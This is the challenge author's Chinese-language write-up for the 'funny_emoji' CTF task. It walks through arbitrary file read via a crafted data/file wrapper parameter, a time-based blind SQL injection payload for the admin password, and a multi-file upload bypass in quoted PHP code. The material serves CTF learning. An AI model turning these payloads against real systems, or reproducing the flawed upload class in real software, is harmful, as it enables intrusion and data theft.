

  出题人自己都觉得自己这题出的太垃圾了，许多地方考虑不周，而且又双叒叕写错了正则。。。

  题目大致有三个点：任意文件读取，注密码进后台，文件上传

### funny_emoji_1（任意文件读取）

​	注册一个普通用户，进去生成一个表情，抓包看一下，容易发现几个奇怪的参数

` http://ctfgame.acdxvfsvd.net:21001/image.php?name=rabbit&data=xixixi%0a&ptl=CgIABwgcHEdWFhdbFl5SWl0f`

其中name是图片名，data是我们写的字，ptl这个比较奇怪，解base64没什么有意义的东西，于是我们再回到页面，去查看一下这个请求是怎么生成的，在页面中看到一段混淆的js，拿到网上在线解或者直接console.log，得到

```javascript
function encccccrypt(s) {
    flag = '';
    for (i = 0; i < s.length; i++) {
        flag += String.fromCharCode(s.charCodeAt(i) ^ key.charCodeAt(i % key.length))
    }
    return btoa(flag)
}
var key = 'nctf23333';

function hold_data(s) {
    return s.replace('\n', '%0a')
}
var enccccrypt = atob;

function get_images() {
    var s = document.getElementById('sel');
    var i = document.getElementById('ima');
    var index = s.selectedIndex;
    i.src = "images/" + s.options[index].value + ".jpg"
}

function get_my_image() {
    var s = document.getElementById('sel');
    var i = document.getElementById('ima2');
    var t = document.getElementById('text');
    var index = s.selectedIndex;
    var im_name = s.options[index].value;
    var im_text = t.value;
    var ptl = encccccrypt(enccccrypt("ZGF0YTovL3RleHQvcGxhaW4s"));
    var data = hold_data(im_text);
    i.src = "image.php?name=" + im_name + "&data=" + data + "&ptl=" + ptl
}
```

  容易发现，这里其实就是对我们传过去的字符串和 `nctf23333` 做一下异或，再看一下里面 `ZGF0YTovL3RleHQvcGxhaW4s` 这串，解base64直接就是 `data://text/plain,` 于是直接去构造这个参数，这里后台对 ptl 没做太大的限制，所以可以传一个字母加密后的数据，然后和data进行拼接，即 `http://ctfgame.acdxvfsvd.net:21001/image.php?name=test1&data=ile:///var/www/html/image.php&ptl=CA==` ，CA== 就是 `b64encode(chr(ord('n')^ord('f'))) ` 。然后再去读一下flag.php ，拿到第一个flag。

​	这个地方有个坑点，本来是想看图审计源码的，因为感觉要看源码主要是做第三个点是有这个需要，而且代码不多，但实际上好像。。。。  （甚至留了个控制坐标的参数

### funny_emoji_2（注密码进后台）

  这个地方看源码其实也没太大用，直接做就好了，跑一下关键字脚本可以发现 `mid,substr,lpad,rpad..` 许多操作字符串和比较字符串的都被ban掉了。`https://dev.mysql.com/doc/refman/5.7/en/func-op-summary-ref.html` 进去找一下 `ctrl+f string` ，就能找到几个能用的了 

`'||!strcmp(username,'admin')&&!strcmp((insert(insert(password,%s,length(password),''),1,%s,'')),'%s')&&sleep(10)&&'1` 

给一个自己的payload。（用什么异或，between啊之类的都行）

### funny_emoji_3（文件上传）

  直接看源码 upload.php 和 0n1y_4_Admin.php

```php
if(isset($_POST['upload'])){
	$parts = pathinfo($_FILES['upfile']['name']);
	$ext = $parts['extension'];
	$name = Filter::check_emoji_name($_POST['name_of_emoji']).'.'.$ext;
	$file = $dir.$name;
	//var_dump($file);
	if(is_file($file)) unlink($file);
	$upload = new Upload($_FILES, $dir, $name, 'jpg');
	if($upload->save()) {
		echo "<script>alert('upload success');window.location('index.php')</script>";
	}else{
		echo 'something_error';
	}
}
```

```php
<?php

class Upload {
	var $file;
	var $file_name;
	var $file_size;
	var $file_type;
	var $file_error;
	var $ext;
	var $maxsize = 2000000;
	var $save_name;
	var $save_path;
	var $allowext;

	function __construct($filee,$savepath,$savename,$allow){
		foreach($filee as $f){
			$this->file = $f['tmp_name'];
			$this->file_name = $f['name'];
			$this->file_size = $f['size'];
			$this->file_type = $f['type'];
			$this->file_error = $f['error'];
		}
		$parts = pathinfo($this->file_name);
		$this->ext = $parts['extension'];
		$this->allowext = $allow;
		$this->save_path = $savepath;
		$this->save_name = $savename;
	}

	function save(){
		if($this->check()){
			if(!is_uploaded_file($this->file))	die('upload_error');
			if(!move_uploaded_file($this->file, $this->save_path.$this->save_name))	die('upload_error');
			return 1;
		}
		return 0;
	}

	function check(){
		if($this->file_error)	die('upload_error');
		if($this->file_size > $this->maxsize)	die('file_too_big');
		if($this->ext !== $this->allowext)	die('only_jpg');
		return 1;
	}
}
```

  对漏洞比较熟悉的话，很容易就能看出来，这是 DESTOON 之前爆出来的一个文件上传的漏洞，由于这个 foreach ，和路径的原因，可以直接多文件上传来绕过。

`https://chybeta.github.io/2018/09/24/Destoon-20180827%E7%89%88%E6%9C%AC-%E5%89%8D%E5%8F%B0getshell/`

其中文件路径，可以通过读取 session 来获得 `/tmp/sexx_{your_session_id}`

赛后上去看了一下，还真有人做出来了。。。（膜一下这位师傅

（再膜一下日穿我数据库的 Li4no ....

（放github的源码是改过的，给源码 fuck_me.zip 。。。

